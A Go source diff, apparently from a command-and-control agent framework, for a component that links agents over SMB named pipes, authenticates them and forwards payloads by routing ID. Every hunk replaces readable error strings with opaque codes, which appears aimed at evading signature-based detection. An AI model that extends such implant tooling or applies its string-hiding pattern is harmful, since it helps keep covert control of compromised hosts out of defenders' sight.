@@ -84,20 +84,20 @@ func (lm *LinkManager) Link(pipePath string) (string, error) {
 	// Check if already linked to this pipe
 	if existingRoute, exists := lm.pipeToRoute[pipePath]; exists {
 		if link, ok := lm.links[existingRoute]; ok && link.IsActive {
-			return "", fmt.Errorf("already linked to %s (routing_id: %s)", pipePath, existingRoute)
+			return "", fmt.Errorf(Err(E5))
 		}
 	}
 
 	// Connect to the named pipe
 	conn, err := connectToPipe(pipePath)
 	if err != nil {
-		return "", fmt.Errorf("failed to connect to pipe %s: %w", pipePath, err)
+		return "", fmt.Errorf(ErrCtx(E12, err.Error()))
 	}
 
 	// Perform lightweight authentication with the SMB agent
 	if err := performLinkAuth(conn); err != nil {
 		conn.Close()
-		return "", fmt.Errorf("link authentication failed: %w", err)
+		return "", fmt.Errorf(ErrCtx(E3, err.Error()))
 	}
 
 	// Generate routing ID
@@ -130,7 +130,7 @@ func (lm *LinkManager) Unlink(routingID string) error {
 
 	link, exists := lm.links[routingID]
 	if !exists {
-		return fmt.Errorf("no link found with routing_id: %s", routingID)
+		return fmt.Errorf(Err(E4))
 	}
 
 	// Send graceful disconnect message
@@ -188,14 +188,14 @@ func (lm *LinkManager) GetActiveLinks() []*LinkedAgent {
 func (lm *LinkManager) ForwardToLinkedAgent(routingID string, payload string) error {
 	link, exists := lm.GetLink(routingID)
 	if !exists {
-		return fmt.Errorf("no active link for routing_id: %s", routingID)
+		return fmt.Errorf(Err(E4))
 	}
 
 	link.mu.Lock()
 	defer link.mu.Unlock()
 
 	if link.Conn == nil || !link.IsActive {
-		return fmt.Errorf("link is not active")
+		return fmt.Errorf(Err(E4))
 	}
 
 	// Send the payload over the pipe
@@ -206,13 +206,13 @@ func (lm *LinkManager) ForwardToLinkedAgent(routingID string, payload string) er
 
 	data, err := json.Marshal(message)
 	if err != nil {
-		return fmt.Errorf("failed to marshal message: %w", err)
+		return fmt.Errorf(ErrCtx(E18, err.Error()))
 	}
 
 	// Write length-prefixed message
 	if err := writeMessage(link.Conn, data); err != nil {
 		link.IsActive = false
-		return fmt.Errorf("failed to write to pipe: %w", err)
+		return fmt.Errorf(ErrCtx(E11, err.Error()))
 	}
 
 	link.LastSeen = time.Now()
@@ -272,7 +272,7 @@ func (lm *LinkManager) WaitForLinkData(routingID string, timeout time.Duration) 
 	case response := <-respChan:
 		return response, nil
 	case <-time.After(timeout):
-		return nil, fmt.Errorf("timeout waiting for data from %s", routingID)
+		return nil, fmt.Errorf(Err(E9))
 	}
 }
 
@@ -390,7 +390,7 @@ func (lm *LinkManager) ListLinks() string {
 	defer lm.mu.RUnlock()
 
 	if len(lm.links) == 0 {
-		return "No active links"
+		return Succ(S0)
 	}
 
 	result := fmt.Sprintf("Active Links (%d):\n", len(lm.links))
@@ -422,7 +422,7 @@ func connectToPipe(pipePath string) (net.Conn, error) {
 		time.Sleep(100 * time.Millisecond)
 	}
 
-	return nil, fmt.Errorf("timeout connecting to pipe")
+	return nil, fmt.Errorf(Err(E9))
 }
 
 func performLinkAuth(conn net.Conn) error {
@@ -438,7 +438,7 @@ func performLinkAuth(conn net.Conn) error {
 	// Read challenge
 	challenge, err := readMessage(conn)
 	if err != nil {
-		return fmt.Errorf("failed to read challenge: %w", err)
+		return fmt.Errorf(ErrCtx(E10, err.Error()))
 	}
 
 	// Simple challenge-response for now
@@ -446,17 +446,17 @@ func performLinkAuth(conn net.Conn) error {
 	response := append([]byte("AUTH:"), challenge...)
 
 	if err := writeMessage(conn, response); err != nil {
-		return fmt.Errorf("failed to send auth response: %w", err)
+		return fmt.Errorf(ErrCtx(E11, err.Error()))
 	}
 
 	// Read confirmation
 	confirm, err := readMessage(conn)
 	if err != nil {
-		return fmt.Errorf("failed to read auth confirmation: %w", err)
+		return fmt.Errorf(ErrCtx(E10, err.Error()))
 	}
 
 	if string(confirm) != "OK" {
-		return fmt.Errorf("authentication rejected")
+		return fmt.Errorf(Err(E3))
 	}
 
 	return nil
@@ -497,7 +497,7 @@ func readMessage(conn net.Conn) ([]byte, error) {
 
 	// Sanity check
 	if length > 10*1024*1024 { // 10MB max
-		return nil, fmt.Errorf("message too large: %d bytes", length)
+		return nil, fmt.Errorf(Err(E2))
 	}
 
 	// Read data
